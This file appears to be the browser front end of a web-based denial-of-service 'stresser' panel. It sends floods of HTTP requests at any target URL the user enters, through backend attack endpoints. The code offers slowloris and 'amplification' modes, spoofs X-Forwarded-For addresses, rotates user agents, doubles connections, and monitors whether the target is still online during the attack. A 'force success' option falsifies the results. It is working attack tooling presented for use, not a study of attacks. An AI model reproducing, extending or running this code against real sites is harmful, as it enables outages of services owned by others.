// DOM Elements
const targetUrl = document.getElementById('targetUrl');
const method = document.getElementById('method');
const httpVersion = document.getElementById('httpVersion');
const attackType = document.getElementById('attackType');
const amplifyToggle = document.getElementById('amplifyToggle');
const amplifyKb = document.getElementById('amplifyKb');
const amplifyValue = document.getElementById('amplifyValue');
const dualConnection = document.getElementById('dualConnection');
const forceSuccessCheck = document.getElementById('forceSuccess');
const customHeaders = document.getElementById('customHeaders');
const cookies = document.getElementById('cookies');
const concurrencyInput = document.getElementById('concurrency');
const totalInput = document.getElementById('total');
const timeoutInput = document.getElementById('timeout');
const randomDelayInput = document.getElementById('randomDelay');
const spoofIp = document.getElementById('spoofIp');
const randomUA = document.getElementById('randomUA');
const ipPrefix = document.getElementById('ipPrefix');
const startBtn = document.getElementById('startBtn');
const batchBtn = document.getElementById('batchBtn');
const stopBtn = document.getElementById('stopBtn');
const exportBtn = document.getElementById('exportBtn');
const refreshPreviewBtn = document.getElementById('refreshPreview');
const targetFrame = document.getElementById('targetFrame');
const healthIndicator = document.getElementById('healthIndicator');
const healthText = document.getElementById('healthText');
const responseTimeText = document.getElementById('responseTimeText');
const successSpan = document.getElementById('successCount');
const failSpan = document.getElementById('failCount');
const avgSpan = document.getElementById('avgTime');
const rpsSpan = document.getElementById('rps');
const errorRateSpan = document.getElementById('errorRate');
const totalBytesSpan = document.getElementById('totalBytes');
const trafficMbpsSpan = document.getElementById('trafficMbps');
const progressBar = document.getElementById('progressBar');
const progressText = document.getElementById('progressText');
const logArea = document.getElementById('logArea');
const rtChartCanvas = document.getElementById('rtChart');
const rawResponsePreview = document.getElementById('rawResponsePreview');

// State
let chart;
let abortController = null;
let isRunning = false;
let stats = {
    success: 0, fail: 0, times: [], totalBytes: 0,
    startTime: 0, total: 0
};
let lastChartUpdate = 0;
let lastTrafficUpdate = 0;
let lastTotalBytes = 0;
let healthCheckInterval = null;
let heartbeatInterval = null;

// Inisialisasi slider amplifikasi
let amplificationKB = 500;
amplifyKb.addEventListener('input', () => {
    amplificationKB = parseInt(amplifyKb.value);
    amplifyValue.innerText = amplificationKB + ' KB';
});
amplifyValue.innerText = '500 KB';

// Fungsi helper
function updateTrafficEstimator() {
    const now = Date.now();
    if (lastTrafficUpdate !== 0 && now - lastTrafficUpdate >= 1000) {
        const deltaBytes = stats.totalBytes - lastTotalBytes;
        const mbps = (deltaBytes * 8) / 1e6;
        trafficMbpsSpan.innerText = mbps.toFixed(2);
        lastTotalBytes = stats.totalBytes;
        lastTrafficUpdate = now;
    } else if (lastTrafficUpdate === 0) {
        lastTrafficUpdate = now;
        lastTotalBytes = stats.totalBytes;
    }
}
setInterval(updateTrafficEstimator, 1000);

function addLog(msg, isError = false) {
    const div = document.createElement('div');
    div.className = `border-l-2 pl-2 mb-1 ${isError ? 'border-red-500 text-red-300' : 'border-green-500 text-green-300'}`;
    div.innerHTML = `${isError ? '❌' : '✅'} ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
    if (logArea.children.length > 100) logArea.removeChild(logArea.firstChild);
}

function updateUI() {
    successSpan.innerText = stats.success;
    failSpan.innerText = stats.fail;
    const done = stats.success + stats.fail;
    const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
    errorRateSpan.innerText = errorRate + '%';
    totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
    if (stats.times.length) {
        const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
        avgSpan.innerText = avg.toFixed(1);
    } else avgSpan.innerText = "0";
    if (stats.startTime && isRunning) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (done / elapsed).toFixed(1);
    } else if (stats.startTime) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
    }
    const percent = (done / stats.total) * 100;
    progressBar.style.width = `${percent}%`;
    progressText.innerText = `${done}/${stats.total}`;
    updateTrafficEstimator();
}

function updateChart(ms) {
    if (!chart) return;
    const now = Date.now();
    if (now - lastChartUpdate > 150 || chart.data.datasets[0].data.length % 3 === 0) {
        chart.data.datasets[0].data.push(ms);
        if (chart.data.datasets[0].data.length > 60) chart.data.datasets[0].data.shift();
        chart.update('none');
        lastChartUpdate = now;
    }
}

function resetStats() {
    stats = { success:0, fail:0, times:[], totalBytes:0, startTime:0, total:0 };
    if (chart) { chart.data.datasets[0].data = []; chart.update(); }
    lastTrafficUpdate = 0;
    lastTotalBytes = 0;
    updateUI();
}

// Helper untuk membuat headers acak
function randomIP() {
    const prefix = ipPrefix.value || "192.168.1.";
    return prefix + Math.floor(Math.random() * 255);
}
function randomUserAgent() {
    const agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}
function parseCustomHeaders() {
    try { return JSON.parse(customHeaders.value); } catch(e) { return {}; }
}
function parseCookies() {
    const obj = {};
    cookies.value.split(';').forEach(c => { let [k,v] = c.trim().split('='); if (k) obj[k] = v || ''; });
    return obj;
}

// Membangun headers lengkap
function buildHeaders() {
    let headers = parseCustomHeaders();
    if (spoofIp.checked) headers["X-Forwarded-For"] = randomIP();
    if (randomUA.checked) headers["User-Agent"] = randomUserAgent();
    const cookieStr = Object.entries(parseCookies()).map(([k,v])=>`${k}=${v}`).join('; ');
    if (cookieStr) headers["Cookie"] = cookieStr;
    return headers;
}

// ==================== SINGLE ATTACK (frontend concurrency) ====================
async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType, amplifyEnabled, amplifyKB) {
    if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
    const headers = buildHeaders();
    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), Math.min(timeout, 9000));
    const start = performance.now();
    try {
        const res = await fetch('/api/attack', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url, method, headers, body: body || "",
                timeout: Math.min(timeout, 9000), retryCount, randomDelay,
                keepAlive, attackType,
                amplifyKB: amplifyEnabled ? amplificationKB : 0,
                amplifyEnabled,
                amplifyType: 'normal'
            }),
            signal: controller.signal
        });
        clearTimeout(tid);
        const data = await res.json();
        const duration = data.durationMs || (performance.now() - start);
        return {
            success: data.success,
            duration,
            statusCode: data.statusCode,
            retries: data.retries || 0,
            error: data.error || '',
            size: (data.responseSize || 0) + (amplifyEnabled ? amplificationKB * 1024 : 0),
            responseBody: data.responseBody || ''
        };
    } catch (err) {
        clearTimeout(tid);
        let duration = performance.now() - start;
        if (err.name === 'AbortError') duration = timeout;
        return { success: false, duration, error: err.message || 'network error', retries: 0, size: 0, responseBody: '' };
    }
}

async function runSingleAttack(url, method, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, amplifyEnabled, amplifyKB, onDone, signal) {
    let index = 0, active = 0, stopped = false;
    const multiplier = dualConnection.checked ? 2 : 1;
    const actualTotal = total * multiplier;
    const actualConcurrency = Math.min(concurrency * multiplier, 100); // batas Vercel
    const next = async () => {
        if (stopped || (signal && signal.aborted)) { stopped = true; return; }
        if (index >= actualTotal) { if (active === 0) return; return; }
        index++;
        active++;
        const result = await sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType, amplifyEnabled, amplifyKB);
        onDone(result.success, result.duration, result.error, result.retries, result.size, result.statusCode, result.responseBody);
        active--;
        if (!stopped && !(signal && signal.aborted)) next();
    };
    for (let i = 0; i < Math.min(actualConcurrency, actualTotal); i++) next();
    return new Promise(resolve => {
        const interval = setInterval(() => {
            if ((index >= actualTotal && active === 0) || (signal && signal.aborted)) {
                clearInterval(interval);
                resolve();
            }
        }, 20);
    });
}

async function startSingleAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method.value;
    let body = ''; // payload opsional
    let total = Math.min(parseInt(totalInput.value), 5000);
    let concurrency = Math.min(parseInt(concurrencyInput.value), 100);
    let timeout = Math.min(parseInt(timeoutInput.value), 9000);
    let randomDelay = parseInt(randomDelayInput.value);
    let keepAlive = attackType.value === 'slowloris';
    let attack = attackType.value;
    let amplifyEnabled = amplifyToggle.checked;
    let ampKB = amplificationKB;
    if (total < 1 || total > 5000) { addLog("Total 1-5000", true); return; }
    if (concurrency < 1 || concurrency > 100) { addLog("Concurrency 1-100", true); return; }
    resetStats();
    stats.total = total;
    stats.startTime = Date.now();
    isRunning = true;
    abortController = new AbortController();
    startBtn.disabled = true;
    batchBtn.disabled = true;
    stopBtn.disabled = false;
    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attack} | Amp:${amplifyEnabled?ampKB+"KB":"OFF"} | Concurrency:${concurrency} | Total:${total}`);
    const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
        const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
        let finalSuccess = success;
        if (forceSuccessCheck.checked) finalSuccess = true;
        if (finalSuccess) {
            stats.success++;
            stats.times.push(duration);
            stats.totalBytes += size;
            updateChart(duration);
        } else {
            stats.fail++;
            const errorMsg = err && typeof err === 'string' ? err : 'unknown';
            addLog(`Failed after ${retriesUsed+1} att: ${errorMsg} (${duration.toFixed(0)}ms)`, true);
        }
        let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
        if (responseBody) preview += `\nBody: ${responseBody.substring(0, 200)}`;
        rawResponsePreview.innerText = preview;
        updateUI();
    };
    try {
        await runSingleAttack(url, mtd, body, total, concurrency, timeout, 0, randomDelay, keepAlive, attack, amplifyEnabled, ampKB, onDone, abortController.signal);
        const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
        addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB | Mbps: ${trafficMbpsSpan.innerText}`);
    } catch(e) { addLog(`System error: ${e.message}`, true); }
    finally {
        isRunning = false;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        stopBtn.disabled = true;
        updateUI();
        abortController = null;
    }
}

// ==================== BATCH ATTACK (backend concurrency) ====================
async function startBatchAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method.value;
    let body = '';
    let total = Math.min(parseInt(totalInput.value), 5000);
    let concurrency = Math.min(parseInt(concurrencyInput.value), 50);
    let timeout = Math.min(parseInt(timeoutInput.value), 9000);
    let randomDelay = parseInt(randomDelayInput.value);
    let keepAlive = attackType.value === 'slowloris';
    let attack = attackType.value;
    let amplifyEnabled = amplifyToggle.checked;
    let ampKB = amplificationKB;
    const headers = buildHeaders();
    addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Type:${attack} | Amp:${amplifyEnabled?ampKB+"KB":"OFF"} | Concurrency:${concurrency} | Total:${total}`);
    resetStats();
    stats.total = total;
    stats.startTime = Date.now();
    isRunning = true;
    abortController = new AbortController();
    startBtn.disabled = true;
    batchBtn.disabled = true;
    stopBtn.disabled = false;
    try {
        const res = await fetch('/api/batch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url, method: mtd, headers, body,
                timeout, retryCount: 0, randomDelay, keepAlive,
                attackType: attack,
                amplifyKB: amplifyEnabled ? ampKB : 0,
                amplifyEnabled,
                amplifyType: 'normal',
                concurrency,
                total,
                continuous: false,
                intervalMs: 0
            }),
            signal: abortController.signal
        });
        const data = await res.json();
        if (data.success) {
            stats.success = data.successCount;
            stats.fail = data.failCount;
            stats.totalBytes = data.totalBytes;
            stats.times = data.latencies || [];
            updateUI();
            addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps}`);
            rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
        } else {
            addLog(`Batch error: ${data.error}`, true);
        }
    } catch(e) {
        if (e.name !== 'AbortError') addLog(`Batch error: ${e.message}`, true);
    } finally {
        isRunning = false;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        stopBtn.disabled = true;
        abortController = null;
    }
}

function stopAttack() {
    if (isRunning && abortController) {
        abortController.abort();
        addLog("🛑 Attack stopped by operator");
        stopBtn.disabled = true;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        isRunning = false;
    } else {
        addLog("No attack running", true);
    }
}

function exportCSV() {
    if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data to export", true); return; }
    let csv = "ResponseTime(ms),Success,Failed\n";
    stats.times.forEach(t => csv += `${t},1,0\n`);
    for (let i=0; i<stats.fail; i++) csv += "0,0,1\n";
    const blob = new Blob([csv], {type:"text/csv"});
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `stresser_${Date.now()}.csv`;
    link.click();
    addLog("CSV exported");
}

// Health check & preview
async function checkTargetHealth(url) {
    try {
        const start = performance.now();
        await fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-cache' });
        const duration = performance.now() - start;
        responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
        healthIndicator.className = 'health-online w-3 h-3 rounded-full';
        healthText.innerText = 'Online';
    } catch(e) {
        healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
        healthText.innerText = 'Offline';
        responseTimeText.innerText = '';
    }
}
function updatePreview(url) {
    let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
    targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
}
refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl.value.trim(); if(u) checkTargetHealth(u); }, 5000); }
async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); document.getElementById('activeUsers') ? document.getElementById('activeUsers').innerText = data.active : null; } catch(e) {} }
function startHeartbeat() { if(heartbeatInterval) clearInterval(heartbeatInterval); heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }

// Event listeners
startBtn.onclick = startSingleAttack;
batchBtn.onclick = startBatchAttack;
stopBtn.onclick = stopAttack;
exportBtn.onclick = exportCSV;

// Inisialisasi chart
window.onload = () => {
    const ctx = rtChartCanvas.getContext('2d');
    chart = new Chart(ctx, {
        type: 'line',
        data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
        options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
    });
    fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
    let u = targetUrl.value.trim(); if(u) updatePreview(u);
    startHealthCheck();
    startHeartbeat();
};
